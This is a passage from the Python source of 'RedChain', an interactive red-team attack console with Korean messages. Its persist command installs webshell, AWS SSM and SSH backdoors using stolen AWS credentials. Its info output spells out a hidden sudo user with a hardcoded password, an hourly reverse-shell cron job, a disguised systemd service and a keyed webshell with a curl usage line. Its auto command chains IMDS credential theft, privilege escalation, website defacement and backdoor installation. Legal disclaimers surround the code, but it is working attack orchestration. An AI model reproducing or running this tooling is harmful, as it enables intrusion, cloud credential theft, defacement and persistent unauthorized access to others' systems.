            os.system(cmd)
            return

        elif arg == 'webshell':
            # 웹쉘 기반 백도어 (SSH 불필요)
            script_path = self.project_root / '03_Persistence' / 'webshell_backdoor.py'

            if not script_path.exists():
                print(f"{Colors.FAIL}[-] 스크립트를 찾을 수 없습니다: {script_path}{Colors.ENDC}")
                return

            print(f"{Colors.WARNING}[!] 웹쉘을 통한 백도어 설치{Colors.ENDC}")
            print(f"{Colors.FAIL}[!] 승인된 레드팀 시뮬레이션 환경에서만 사용하세요!{Colors.ENDC}\n")

            confirm = input(f"{Colors.WARNING}계속하시겠습니까? (yes/no): {Colors.ENDC}")
            if confirm.lower() != 'yes':
                print(f"{Colors.FAIL}[-] 취소됨{Colors.ENDC}")
                return

            tor_flag = "--tor" if self.use_tor else ""
            cmd = f"python3 {script_path} {self.target} {tor_flag}"
            print(f"{Colors.OKCYAN}[*] 실행 중: {cmd}{Colors.ENDC}\n")
            os.system(cmd)
            return

        elif arg == 'ssm':
            # AWS SSM 기반 백도어 (SSH 불필요)
            script_path = self.project_root / '03_Persistence' / 'ssm_backdoor.py'

            if not script_path.exists():
                print(f"{Colors.FAIL}[-] 스크립트를 찾을 수 없습니다: {script_path}{Colors.ENDC}")
                return

            print(f"{Colors.WARNING}[!] AWS SSM을 통한 백도어 설치{Colors.ENDC}")
            print(f"{Colors.FAIL}[!] 승인된 레드팀 시뮬레이션 환경에서만 사용하세요!{Colors.ENDC}\n")

            # credentials 확인
            if not self.aws_credentials:
                print(f"{Colors.WARNING}[!] AWS credentials 로드 중...{Colors.ENDC}\n")
                self.aws_credentials = self.load_latest_credentials()

            if not self.aws_credentials:
                print(f"{Colors.FAIL}[-] AWS credentials를 찾을 수 없습니다{Colors.ENDC}")
                print(f"{Colors.FAIL}[-] 먼저 'imds' 명령어를 실행하세요{Colors.ENDC}")
                return

            confirm = input(f"{Colors.WARNING}계속하시겠습니까? (yes/no): {Colors.ENDC}")
            if confirm.lower() != 'yes':
                print(f"{Colors.FAIL}[-] 취소됨{Colors.ENDC}")
                return

            # 환경 변수로 credentials 전달
            env = os.environ.copy()
            env['AWS_ACCESS_KEY_ID'] = self.aws_credentials['AccessKeyId']
            env['AWS_SECRET_ACCESS_KEY'] = self.aws_credentials['SecretAccessKey']
            env['AWS_SESSION_TOKEN'] = self.aws_credentials.get('Token', '')

            cmd = f"python3 {script_path}"
            print(f"{Colors.OKCYAN}[*] 실행 중: {cmd}{Colors.ENDC}\n")
            subprocess.run(cmd, shell=True, env=env)
            return

        elif arg == 'ssh':
            # SSH 기반 백도어 (레거시)
            if not self.ssh_user:
                print(f"{Colors.FAIL}[-] SSH 사용자가 설정되지 않았습니다{Colors.ENDC}")
                return

            script_name = 'backdoor_setup.sh'
            action_msg = "백도어 설치 (SSH)"

        elif arg == 'cleanup':
            script_name = 'cleanup_backdoor.sh'
            action_msg = "백도어 제거"
        elif arg == 'info':
            # 정보 표시
            print(f"\n{Colors.BOLD}설치 가능한 Persistence 메커니즘:{Colors.ENDC}\n")
            print(f"{Colors.OKGREEN}1. 백도어 사용자:{Colors.ENDC}")
            print(f"   - Username: sysupdate")
            print(f"   - Password: Sys@Update2024#Secure")
            print(f"   - Sudo: NOPASSWD ALL\n")

            print(f"{Colors.OKGREEN}2. SSH 키 백도어:{Colors.ENDC}")
            print(f"   - authorized_keys에 공개키 추가\n")

            print(f"{Colors.OKGREEN}3. Cron 백도어:{Colors.ENDC}")
            print(f"   - 매 시간마다 리버스 쉘 시도\n")

            print(f"{Colors.OKGREEN}4. Systemd 서비스:{Colors.ENDC}")
            print(f"   - system-update-check 서비스\n")

            print(f"{Colors.OKGREEN}5. 웹쉘:{Colors.ENDC}")
            print(f"   - 경로: /.system/health.php")
            print(f"   - 인증키: RedTeam2024")
            print(f"   - 사용: curl 'http://target/.system/health.php?key=RedTeam2024&cmd=id'\n")

            print(f"{Colors.WARNING}[!] 웹쉘 방식 (추천): persist webshell{Colors.ENDC}")
            print(f"{Colors.WARNING}[!] AWS SSM 방식: persist ssm{Colors.ENDC}")
            print(f"{Colors.WARNING}[!] SSH 방식: persist ssh{Colors.ENDC}")
            print(f"{Colors.WARNING}[!] 제거: persist cleanup{Colors.ENDC}\n")
            return
        else:
            print(f"{Colors.FAIL}[-] 알 수 없는 옵션: {arg}{Colors.ENDC}")
            print(f"{Colors.OKBLUE}[*] 사용법: persist [webshell|ssm|ssh|cleanup|info]{Colors.ENDC}\n")
            return

        # SSH/cleanup 방식 (레거시)
        if not self.ssh_user:
            print(f"{Colors.FAIL}[-] SSH 사용자가 설정되지 않았습니다{Colors.ENDC}")
            return

        script_path = self.project_root / '03_Persistence' / script_name

        if not script_path.exists():
            print(f"{Colors.FAIL}[-] 스크립트를 찾을 수 없습니다: {script_path}{Colors.ENDC}")
            return

        print(f"{Colors.WARNING}[!] {action_msg}를 실행합니다.{Colors.ENDC}")
        print(f"{Colors.FAIL}[!] 승인된 레드팀 시뮬레이션 환경에서만 사용하세요!{Colors.ENDC}\n")

        # 확인
        if arg != 'cleanup':
            confirm = input(f"{Colors.WARNING}계속하시겠습니까? (yes/no): {Colors.ENDC}")
            if confirm.lower() != 'yes':
                print(f"{Colors.FAIL}[-] 취소됨{Colors.ENDC}")
                return

        # SSH 인증 방식 결정
        if self.ssh_key:
            sshpass_prefix = ""
            ssh_opts = f"-i {self.ssh_key} -o StrictHostKeyChecking=no"
        elif self.ssh_pass:
            sshpass_prefix = f"sshpass -p '{self.ssh_pass}' "
            ssh_opts = "-o StrictHostKeyChecking=no"
        else:
            sshpass_prefix = ""
            ssh_opts = "-o StrictHostKeyChecking=no"

        # 예전 스크립트 삭제
        rm_cmd = f"{sshpass_prefix}ssh {ssh_opts} {self.ssh_user}@{self.target} 'rm -f /tmp/{script_name}'"
        os.system(rm_cmd + " 2>/dev/null")

        # 스크립트 전송
        print(f"{Colors.OKBLUE}[*] 스크립트 전송 중...{Colors.ENDC}")
        scp_cmd = f"{sshpass_prefix}scp {ssh_opts} {script_path} {self.ssh_user}@{self.target}:/tmp/"
        result = os.system(scp_cmd)

        if result != 0:
            print(f"{Colors.FAIL}[-] 파일 전송 실패{Colors.ENDC}")
            return

        # 스크립트 실행
        print(f"{Colors.OKBLUE}[*] {action_msg} 실행 중...{Colors.ENDC}\n")
        ssh_cmd = f"{sshpass_prefix}ssh {ssh_opts} {self.ssh_user}@{self.target} 'sudo bash /tmp/{script_name}'"
        os.system(ssh_cmd)

    # ==================== SSH 명령어 ====================

    def do_ssh(self, arg):
        """SSH 연결

사용법:
    ssh            - 타겟 서버에 SSH 연결
    ssh <명령어>   - SSH로 원격 명령 실행

예제:
    ssh
    ssh whoami
    ssh 'cat /etc/passwd'
"""
        if not self.target:
            print(f"{Colors.FAIL}[-] 타겟이 설정되지 않았습니다.{Colors.ENDC}")
            return

        # SSH 사용자 표시
        if not self.ssh_user or self.ssh_user == 'ec2-user':
            print(f"{Colors.WARNING}[!] SSH 사용자: {self.ssh_user} (기본값){Colors.ENDC}")
            print(f"{Colors.WARNING}[!] 다른 사용자를 사용하려면: set ssh_user <사용자명>{Colors.ENDC}\n")

        ssh_key_opt = f"-i {self.ssh_key} " if self.ssh_key else ""

        if arg:
            # 원격 명령 실행
            cmd = f"ssh {ssh_key_opt}{self.ssh_user}@{self.target} '{arg}'"
        else:
            # 대화형 SSH
            cmd = f"ssh {ssh_key_opt}{self.ssh_user}@{self.target}"

        print(f"{Colors.OKCYAN}[*] {cmd}{Colors.ENDC}\n")
        os.system(cmd)

    def do_scp(self, arg):
        """SCP 파일 전송

사용법:
    scp <로컬경로> <원격경로>      - 파일 업로드
    scp -d <원격경로> <로컬경로>   - 파일 다운로드

예제:
    scp /tmp/test.txt /home/ec2-user/
    scp -d /var/log/apache2/access.log ./logs/
"""
        if not self.target:
            print(f"{Colors.FAIL}[-] 타겟이 설정되지 않았습니다.{Colors.ENDC}")
            return

        args = arg.split()
        if len(args) < 2:
            print(f"{Colors.FAIL}[-] 사용법: scp <로컬경로> <원격경로>{Colors.ENDC}")
            return

        ssh_key_opt = f"-i {self.ssh_key} " if self.ssh_key else ""

        if args[0] == '-d':
            # 다운로드
            remote_path = args[1]
            local_path = args[2] if len(args) > 2 else '.'
            cmd = f"scp {ssh_key_opt}{self.ssh_user}@{self.target}:{remote_path} {local_path}"
        else:
            # 업로드
            local_path = args[0]
            remote_path = args[1]
            cmd = f"scp {ssh_key_opt}{local_path} {self.ssh_user}@{self.target}:{remote_path}"

        print(f"{Colors.OKCYAN}[*] {cmd}{Colors.ENDC}\n")
        os.system(cmd)

    # ==================== 자동화 명령어 ====================

    def do_auto(self, arg):
        """자동 공격 체인 실행

사용법:
    auto recon     - 정찰만 (포트스캔 + 엔드포인트 탐색)
    auto exploit   - 전체 공격 체인 (IMDS → 권한상승 → 변조)
    auto full      - 정찰 + 공격 전체

경고: 'auto exploit'과 'auto full'은 타겟 시스템을 변경합니다!
"""
        if not self.target:
            print(f"{Colors.FAIL}[-] 타겟이 설정되지 않았습니다.{Colors.ENDC}")
            return

        print(f"{Colors.WARNING}{'='*60}{Colors.ENDC}")
        print(f"{Colors.BOLD}자동 공격 체인{Colors.ENDC}")
        print(f"{Colors.WARNING}{'='*60}{Colors.ENDC}\n")

        if arg == 'recon' or arg == 'full':
            print(f"{Colors.BOLD}[1/2] 정찰 단계{Colors.ENDC}\n")
            print(f"{Colors.OKBLUE}[*] 포트 스캔...{Colors.ENDC}")
            self.do_scan('')
            print(f"\n{Colors.OKBLUE}[*] 엔드포인트 탐색...{Colors.ENDC}")
            self.do_enum('api')

        if arg == 'exploit' or arg == 'full':
            print(f"\n{Colors.BOLD}[2/2] 공격 단계{Colors.ENDC}\n")

            confirm = input(f"{Colors.WARNING}[!] 공격을 진행하시겠습니까? (yes/no): {Colors.ENDC}")
            if confirm.lower() != 'yes':
                print(f"{Colors.FAIL}[-] 취소됨{Colors.ENDC}")
                return

            print(f"{Colors.OKBLUE}[*] AWS IMDS 공격...{Colors.ENDC}")
            self.do_imds('')

            print(f"\n{Colors.OKBLUE}[*] AWS 권한 상승...{Colors.ENDC}")
            self.do_escalate('')

            confirm2 = input(f"\n{Colors.WARNING}[!] 웹사이트를 변조하시겠습니까? (yes/no): {Colors.ENDC}")
            if confirm2.lower() == 'yes':
                print(f"{Colors.OKBLUE}[*] 웹사이트 변조...{Colors.ENDC}")
                self.do_deface('')

            confirm3 = input(f"\n{Colors.WARNING}[!] Persistence 백도어를 설치하시겠습니까? (yes/no): {Colors.ENDC}")
            if confirm3.lower() == 'yes':
                print(f"{Colors.OKBLUE}[*] Persistence 백도어 설치...{Colors.ENDC}")
                self.do_persist('install')

        print(f"\n{Colors.OKGREEN}[+] 자동 공격 체인 완료!{Colors.ENDC}\n")

    # ==================== 유틸리티 ====================

    def do_clear(self, arg):
        """화면 지우기"""
        os.system('clear' if os.name != 'nt' else 'cls')

    def do_exit(self, arg):
        """프로그램 종료"""
        print(f"\n{Colors.OKGREEN}[+] RedChain 종료{Colors.ENDC}\n")
        return True

    def do_quit(self, arg):
        """프로그램 종료"""
        return self.do_exit(arg)

    def do_EOF(self, arg):
        """Ctrl+D로 종료"""
        print()
        return self.do_exit(arg)

    def emptyline(self):
        """빈 줄 입력시 아무것도 하지 않음"""
        pass

    def default(self, line):
        """알 수 없는 명령어"""
        print(f"{Colors.FAIL}[-] 알 수 없는 명령어: {line}{Colors.ENDC}")
        print(f"    타입 'help'로 사용 가능한 명령어 확인\n")

def main():
    """메인 함수"""
    # 면책 조항
    print(f"""
{Colors.YELLOW}╔{'═'*68}╗{Colors.ENDC}
{Colors.YELLOW}║{Colors.BOLD}{Colors.RED}                          ⚠  LEGAL NOTICE  ⚠{Colors.ENDC}{' '*26}{Colors.YELLOW}║{Colors.ENDC}
{Colors.YELLOW}╚{'═'*68}╝{Colors.ENDC}

{Colors.WHITE}This tool is for {Colors.BOLD}EDUCATIONAL and RESEARCH purposes ONLY{Colors.ENDC}
{Colors.WHITE}Unauthorized use against systems you don't own is {Colors.RED}ILLEGAL{Colors.ENDC}

{Colors.CYAN}✓{Colors.ENDC} Only use in authorized penetration testing environments
{Colors.CYAN}✓{Colors.ENDC} Never use on production systems without explicit permission
{Colors.CYAN}✓{Colors.ENDC} Unauthorized access may result in legal prosecution

{Colors.GRAY}Related Laws (South Korea):{Colors.ENDC}
{Colors.YELLOW}•{Colors.ENDC} Information and Communications Network Act: {Colors.RED}Up to 5 years imprisonment{Colors.ENDC}
{Colors.YELLOW}•{Colors.ENDC} Electronic Financial Transactions Act: {Colors.RED}Up to 10 years imprisonment{Colors.ENDC}

{Colors.BOLD}{Colors.WHITE}Do you accept these terms and confirm authorized use? (yes/no):{Colors.ENDC} """, end='')

    consent = input().strip().lower()
    if consent != 'yes':
        print(f"\n{Colors.RED}✗ Terminated{Colors.ENDC}\n")
        sys.exit(0)

    print()
    with Loader(desc=f"{Colors.CYAN}Initializing RedChain framework...{Colors.ENDC}",
               end=f"{Colors.GREEN}Framework initialized{Colors.ENDC}"):
        time.sleep(0.8)
    print()

    # CLI 시작
    cli = RedChainCLI()
    cli.update_prompt()
    cli.cmdloop()

if __name__ == '__main__':
    main()
